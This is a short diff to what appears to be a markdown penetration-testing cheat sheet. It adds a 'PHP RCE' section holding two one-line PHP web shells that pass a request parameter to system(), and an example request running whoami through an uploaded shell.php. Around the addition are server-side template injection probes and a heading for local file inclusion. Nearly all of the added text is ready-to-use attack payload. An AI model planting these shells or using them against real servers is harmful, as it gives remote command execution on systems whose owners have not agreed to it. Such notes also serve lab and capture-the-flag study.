@@ -209,6 +209,14 @@ ${{7*7}}
 #{7*7}
 *{7+7}
 ```
+## PHP RCE
+
+PHP RCE
+```
+<?php system($_REQUEST['command']) ?>   ---> allow post n get
+<?php system($_GET['command']) ?> ----> only get
+10.10.10.10/shell.php?command=whoami
+```
 
 ## Simple LFI
 
